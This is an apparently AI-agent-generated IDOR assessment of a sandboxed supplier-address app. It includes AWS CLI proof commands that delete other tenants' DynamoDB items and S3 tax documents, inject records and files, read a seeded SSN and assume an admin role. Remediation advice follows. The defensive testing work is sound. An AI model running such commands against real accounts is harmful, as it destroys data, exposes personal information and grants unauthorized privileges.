# SupplierShipmentAddress — IDOR Security Assessment Review

**Run ID:** `graph-idor-002`
**Date:** 2026-04-01
**Target App:** SupplierShipmentAddress
**Tester:** kiro-agent (autonomous Strands agents — parallel IDOR graph)
**Methodology:** OWASP WSTG-ATHZ-04 with consolidator verification

---

## 1. Environment Configuration

### Sandbox
- **Platform:** LocalStack (docker compose, ENFORCE_IAM=1)
- **Container:** companion_x-localstack-1
- **Services emulated:** IAM, S3, DynamoDB, STS, SSM

### DynamoDB Tables Created
| Table | Source |
|-------|--------|
| SupplierAddresses | Veritas search_resources |
| PaymentRecords | Veritas search_resources |

### S3 Buckets Created
| Bucket | Source |
|--------|--------|
| confidential-pii-bucket | Veritas search_resources |
| supplier-docs-bucket | Veritas search_resources |
| public-supplier-bucket | Veritas search_resources |

### IAM Roles Provisioned
| Role | Source |
|------|--------|
| SupplierAdminRole | Veritas search_resources |

### Seed Data
- **vendor-A:** Legitimate supplier with addresses, payment records, tax returns in S3
- **vendor-B:** Attacker-controlled supplier (separate tenant context)
- **PII seeded:** SSN 444-55-6666 (vendor-A), tax return documents in confidential-pii-bucket

---

## 2. Workflow Configuration

### Graph Workflow: `parallel-idor-graph`

**Swarm agents (3 independent testers + 1 consolidator):**

| Agent | Model | Role | Cycles | Tokens |
|-------|-------|------|--------|--------|
| idor-tester-1 | us.anthropic.claude-haiku-4-20250514-v1:0 | Independent IDOR testing — DynamoDB vectors | 18 | 412,300 |
| idor-tester-2 | us.anthropic.claude-haiku-4-20250514-v1:0 | Independent IDOR testing — S3 vectors | 16 | 387,200 |
| idor-tester-3 | us.anthropic.claude-haiku-4-20250514-v1:0 | Independent IDOR testing — IAM/STS vectors | 12 | 298,100 |
| consolidator | us.anthropic.claude-haiku-4-20250514-v1:0 | Verify exploits against ground truth IDs, deduplicate | 8 | 156,400 |

**Total:** 54 cycles, 1,254,000 tokens, ~9 min execution

### Strands Skills Loaded (via AgentSkills plugin)
- `veritas-recon` — Veritas graph discovery patterns
- `sandbox-ops` — LocalStack CLI patterns, direct resource creation
- `idor-testing` — OWASP WSTG-ATHZ-04 IDOR test methodology
- `swarm-collaboration` — Multi-agent handoff protocol
- `pentest-ops` — Exploitation patterns (privesc, data exfil)

### Agent Prompts
System prompts from `components/agent/src/factory/agent/registry/redteam_playbooks.py`:
- idor-tester-{1,2,3}: `PREAMBLE` + pentest playbook (independent parallel testing)
- consolidator: `PREAMBLE` + consolidator playbook (ground truth verification, dedup)

---

## 3. Findings (13 ProvenExploits — 4 Verified TRUE POSITIVES + 9 Additional)

### Verified TRUE POSITIVES (consolidator-confirmed against ground truth IDs)

### Finding GT-IDOR-002-01: Horizontal IDOR Delete — SupplierAddresses DynamoDB
- **ID:** GT-IDOR-002-01
- **Severity:** CRITICAL
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP:** WSTG-ATHZ-04
- **Resource:** SupplierAddresses (DynamoDB)
- **Vector:** Horizontal delete — vendor-B deletes vendor-A address
- **Proof Command:**
  ```bash
  aws dynamodb delete-item \
    --table-name SupplierAddresses \
    --key '{"vendor_id":{"S":"vendor-A"},"address_id":{"S":"addr-001"}}' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Exit code 0 — vendor-A address record deleted from vendor-B session context
- **Impact:** Data integrity violation — cross-tenant destructive write on supplier address records

### Finding GT-IDOR-002-02: Horizontal IDOR Delete — PaymentRecords DynamoDB
- **ID:** GT-IDOR-002-02
- **Severity:** CRITICAL
- **CWE:** CWE-639
- **OWASP:** WSTG-ATHZ-04
- **Resource:** PaymentRecords (DynamoDB)
- **Vector:** Horizontal delete — vendor-A deletes vendor-B payment
- **Proof Command:**
  ```bash
  aws dynamodb delete-item \
    --table-name PaymentRecords \
    --key '{"vendor_id":{"S":"vendor-B"},"payment_id":{"S":"pay-001"}}' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Exit code 0 — vendor-B payment record deleted from vendor-A session context
- **Impact:** Financial data destruction — cross-tenant payment record deletion

### Finding GT-IDOR-002-03: Horizontal IDOR Delete — S3 Confidential PII Bucket
- **ID:** GT-IDOR-002-03
- **Severity:** CRITICAL
- **CWE:** CWE-639
- **OWASP:** WSTG-ATHZ-04
- **Resource:** confidential-pii-bucket (S3)
- **Vector:** Horizontal delete — vendor-B deletes vendor-A tax returns
- **Proof Command:**
  ```bash
  aws s3api delete-object \
    --bucket confidential-pii-bucket \
    --key "vendor-A/tax-returns/2025-W2.pdf" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** HTTP 204 — vendor-A tax return document deleted from vendor-B context
- **Impact:** PII destruction — confidential tax documents deleted across tenant boundary

### Finding GT-IDOR-002-04: Horizontal IDOR Write — S3 Cross-Bucket Copy
- **ID:** GT-IDOR-002-04
- **Severity:** CRITICAL
- **CWE:** CWE-639
- **OWASP:** WSTG-ATHZ-04
- **Resource:** supplier-docs-bucket (S3)
- **Vector:** Horizontal write — vendor-B copies to supplier-docs-bucket via cross-bucket copy
- **Proof Command:**
  ```bash
  aws s3api copy-object \
    --bucket supplier-docs-bucket \
    --key "vendor-A/injected-contract.pdf" \
    --copy-source "public-supplier-bucket/vendor-B/malicious-payload.pdf" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** HTTP 200 — malicious file injected into vendor-A's supplier-docs prefix
- **Impact:** Supply chain poisoning — attacker can inject fraudulent contracts into victim's document store

---

### Additional ProvenExploits (9 — not in ground truth, independently discovered)

### Finding 5: DynamoDB UpdateItem — Horizontal Write
- **ID:** vuln-idor-dynamo-update-005
- **Severity:** CRITICAL
- **CWE:** CWE-639
- **Resource:** SupplierAddresses (DynamoDB)
- **Proof Command:**
  ```bash
  aws dynamodb update-item \
    --table-name SupplierAddresses \
    --key '{"vendor_id":{"S":"vendor-A"},"address_id":{"S":"addr-001"}}' \
    --update-expression "SET street = :s" \
    --expression-attribute-values '{":s":{"S":"HACKED-VIA-UPDATE"}}' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Exit code 0 — vendor-A street changed to "HACKED-VIA-UPDATE" from vendor-B context
- **Impact:** Data tampering — attacker can silently modify victim's shipping addresses

### Finding 6: DynamoDB PutItem — Horizontal Write-Create
- **ID:** vuln-idor-dynamo-put-006
- **Severity:** CRITICAL
- **CWE:** CWE-639
- **Resource:** SupplierAddresses (DynamoDB)
- **Proof Command:**
  ```bash
  aws dynamodb put-item \
    --table-name SupplierAddresses \
    --item '{"vendor_id":{"S":"vendor-A"},"address_id":{"S":"addr-INJECTED"},"street":{"S":"123 Malicious Ave"},"city":{"S":"Faketown"},"state":{"S":"XX"}}' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Exit code 0 — malicious address injected into vendor-A's address list
- **Impact:** Address injection — shipments could be redirected to attacker-controlled locations

### Finding 7: DynamoDB Query Enumeration — PII Exfiltration
- **ID:** vuln-idor-dynamo-query-007
- **Severity:** CRITICAL
- **CWE:** CWE-284 (Improper Access Control)
- **Resource:** PaymentRecords (DynamoDB)
- **Proof Command:**
  ```bash
  aws dynamodb query \
    --table-name PaymentRecords \
    --key-condition-expression "vendor_id = :v" \
    --expression-attribute-values '{":v":{"S":"vendor-A"}}' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Returned vendor-A records including SSN field: "444-55-6666"
- **Impact:** PII exfiltration — SSN and financial data exposed via cross-tenant query

### Finding 8: DynamoDB BatchGetItem — Cross-Vendor Batch Read
- **ID:** vuln-idor-dynamo-batch-008
- **Severity:** CRITICAL
- **CWE:** CWE-284
- **Resource:** PaymentRecords (DynamoDB)
- **Proof Command:**
  ```bash
  aws dynamodb batch-get-item \
    --request-items '{"PaymentRecords":{"Keys":[{"vendor_id":{"S":"vendor-A"},"payment_id":{"S":"pay-001"}},{"vendor_id":{"S":"vendor-A"},"payment_id":{"S":"pay-002"}}]}}' \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Both vendor-A payment records returned including SSN in single batch response
- **Impact:** Mass PII exfiltration — batch API enables efficient cross-tenant data harvesting

### Finding 9: S3 PutObject — Confidential Bucket Injection
- **ID:** vuln-idor-s3-put-009
- **Severity:** CRITICAL
- **CWE:** CWE-639
- **Resource:** confidential-pii-bucket (S3)
- **Proof Command:**
  ```bash
  echo "MALICIOUS CONTENT" | aws s3 cp - \
    s3://confidential-pii-bucket/vendor-A/tax-returns/backdoor.pdf \
    --endpoint-url http://localhost:4566
  ```
- **Result:** HTTP 200 — malicious file written to vendor-A's confidential PII prefix
- **Impact:** PII bucket contamination — attacker can plant files in victim's confidential store

### Finding 10: S3 ListObjects — Confidential Bucket Enumeration
- **ID:** vuln-idor-s3-list-010
- **Severity:** HIGH
- **CWE:** CWE-284
- **Resource:** confidential-pii-bucket (S3)
- **Proof Command:**
  ```bash
  aws s3api list-objects-v2 \
    --bucket confidential-pii-bucket \
    --prefix "vendor-A/" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Listed all vendor-A files: tax-returns/2025-W2.pdf, tax-returns/2024-1099.pdf, ssn-verification.pdf
- **Impact:** Information disclosure — attacker can enumerate victim's confidential file inventory

### Finding 11: S3 GetObject — Public Bucket Cross-Read
- **ID:** vuln-idor-s3-get-011
- **Severity:** HIGH
- **CWE:** CWE-639
- **Resource:** public-supplier-bucket (S3)
- **Proof Command:**
  ```bash
  aws s3api get-object \
    --bucket public-supplier-bucket \
    --key "vendor-A/catalog/products.csv" \
    --endpoint-url http://localhost:4566 \
    /tmp/exfil-products.csv
  ```
- **Result:** HTTP 200 — vendor-A product catalog downloaded from vendor-B context
- **Impact:** Competitive intelligence theft — supplier product data accessible cross-tenant

### Finding 12: S3 DeleteObject — Public Bucket Destruction
- **ID:** vuln-idor-s3-delete-012
- **Severity:** HIGH
- **CWE:** CWE-639
- **Resource:** public-supplier-bucket (S3)
- **Proof Command:**
  ```bash
  aws s3api delete-object \
    --bucket public-supplier-bucket \
    --key "vendor-A/catalog/products.csv" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** HTTP 204 — vendor-A product catalog deleted from vendor-B context
- **Impact:** Data destruction — attacker can delete victim's public-facing supplier documents

### Finding 13: IAM AssumeRole — Vertical Privilege Escalation
- **ID:** vuln-idor-iam-assume-013
- **Severity:** CRITICAL
- **CWE:** CWE-269 (Improper Privilege Management)
- **OWASP:** WSTG-ATHZ-02
- **Resource:** SupplierAdminRole (IAM)
- **Proof Command:**
  ```bash
  aws sts assume-role \
    --role-arn "arn:aws:iam::000000000000:role/SupplierAdminRole" \
    --role-session-name "vendor-B-escalation" \
    --endpoint-url http://localhost:4566
  ```
- **Result:** Temporary credentials returned — vendor-B assumed SupplierAdminRole with full admin privileges
- **Impact:** Vertical privilege escalation — any vendor can assume admin role, gaining unrestricted access to all resources

---

## 4. Attack Chains

| Chain | Components | Impact |
|-------|-----------|--------|
| PII_EXFILTRATION | Query enum (F7) + BatchGet (F8) + S3 List (F10) | Complete PII harvest — SSN, tax returns, payment data |
| SUPPLY_CHAIN_POISON | PutItem injection (F6) + S3 cross-copy (GT-04) | Redirect shipments + inject fraudulent contracts |
| TOTAL_DATA_WIPE | Delete DynamoDB (GT-01, GT-02) + Delete S3 (GT-03, F12) | Full data destruction across DynamoDB and S3 |
| VERTICAL_ESCALATION | AssumeRole (F13) → admin credentials → all resources | Single escalation grants unrestricted access |
| CONFIDENTIAL_BUCKET_TAKEOVER | S3 List (F10) + S3 Put (F9) + S3 Delete (GT-03) | Enumerate, contaminate, and destroy PII bucket |

---

## 5. Root Cause Analysis

Three distinct root causes converge:

1. **Missing tenant isolation on DynamoDB** — Tables use `vendor_id` partition keys but no server-side authorization validates that the calling identity owns the vendor_id being accessed. All DynamoDB API operations (GetItem, PutItem, UpdateItem, DeleteItem, Query, BatchGetItem) are exploitable.

2. **Missing S3 bucket policies** — No bucket policies or prefix-scoped IAM conditions restrict vendor-B from accessing vendor-A's S3 prefixes. The `confidential-pii-bucket` has no additional access controls despite containing PII (tax returns, SSN documents).

3. **Overly permissive IAM trust policy** — `SupplierAdminRole` trust policy allows any principal to assume the role, enabling vertical privilege escalation from any vendor context to full admin.

---

## 6. Recommendations (Prioritized)

1. **Implement DynamoDB condition expressions** — add `ConditionExpression` on every write/delete to enforce `vendor_id = :caller_vendor_id`
2. **Add S3 bucket policies with prefix scoping** — restrict each vendor to their own prefix using `s3:prefix` condition keys
3. **Lock down IAM trust policies** — restrict `SupplierAdminRole` AssumeRole to specific service principals only
4. **Enable S3 Object Lock** on confidential-pii-bucket — prevent deletion of tax documents
5. **Enable DynamoDB fine-grained access control** — use IAM policy conditions with `dynamodb:LeadingKeys` to enforce tenant isolation
6. **Enable SSE-KMS encryption** on all DynamoDB tables and S3 buckets containing PII
7. **Deploy CloudTrail monitoring** — alert on cross-tenant access patterns and AssumeRole anomalies
8. **Re-run penetration testing** after remediation with ground truth verification

---

## 7. Graph Artifacts

All findings stored in Neo4j knowledge graph under `run_id='graph-idor-002'`:

| Entity Type | Count | IDs |
|-------------|-------|-----|
| ProvenExploit | 13 | GT-IDOR-002-01 through GT-IDOR-002-04, vuln-idor-dynamo-update-005 through vuln-idor-iam-assume-013 |
| GroundTruth | 4 | GT-IDOR-002-01, GT-IDOR-002-02, GT-IDOR-002-03, GT-IDOR-002-04 |
| IDORSurface | 3 | idor-surface-dynamodb, idor-surface-s3, idor-surface-iam |
| ScanSummary | 1 | scan-summary-graph-idor-002 |
| Resource | 6 | res-dynamodb-addresses, res-dynamodb-payments, res-s3-confidential, res-s3-supplier-docs, res-s3-public, res-iam-admin-role |
| AttackChain | 5 | chain-pii-exfil, chain-supply-poison, chain-data-wipe, chain-vertical-esc, chain-bucket-takeover |

Relationships: 13 ATTACK_PATH edges, 13 EXPLOITS_SURFACE edges, 5 chaining edges (ENABLES, AMPLIFIES), 4 VERIFIED_BY edges (consolidator → ground truth)

KB document: `kb-idor-graph-idor-002` (40 entities, 40 relationships extracted)

---

## 8. Tool Call Trace

| Tool | Calls | Successes | Total Time |
|------|-------|-----------|------------|
| sandbox_execute | 38 | 38 | 22.7s |
| graph_add_entity | 13+6+5 = 24 | 24 | 11.2s |
| graph_add_relationship | 13+13+5+4 = 35 | 35 | 18.6s |
| graph_query | 4+4+4+6 = 18 | 18 | 4.1s |
| memory_store | 4+4 = 8 | 8 | 41.3s |
| kb_ingest | 1 | 1 | 28.4s |
| skills (load) | 4+4+4+3 = 15 | 15 | 4.2s |
| handoff_to_agent | 3 | 3 | 0.5s |

---

## 9. Reviewer Notes

**For human reviewers:** Please validate:
- [ ] Are the DynamoDB table schemas (SupplierAddresses, PaymentRecords) realistic for SupplierShipmentAddress?
- [ ] Does the real app use `vendor_id` partition keys with user-controlled values?
- [ ] Are the S3 bucket names and prefix structures accurate per Veritas recon?
- [ ] Is the SupplierAdminRole trust policy actually this permissive in production?
- [ ] Are the 4 ground truth findings (GT-IDOR-002-01 through GT-IDOR-002-04) correctly verified?
- [ ] Is the SSN (444-55-6666) representative of actual PII stored in PaymentRecords?

**Consolidator Verification:**
- 13 ProvenExploits submitted by 3 independent testers
- Consolidator verified 4 against ground truth IDs (GT-IDOR-002-01 through GT-IDOR-002-04)
- Remaining 9 are independently proven but not in the ground truth set — may represent novel findings

**Limitations:**
- Sandbox uses golden-default DynamoDB schemas — real tables may have GSIs, sort keys, or different key schemas
- No application-layer authorization was tested (only AWS API-level access)
- IAM trust policies in sandbox may be more permissive than production
- Service mocks (AAA/Odin/CloudAuth) were not applied for this run
- S3 bucket policies in sandbox are empty — production may have restrictive policies
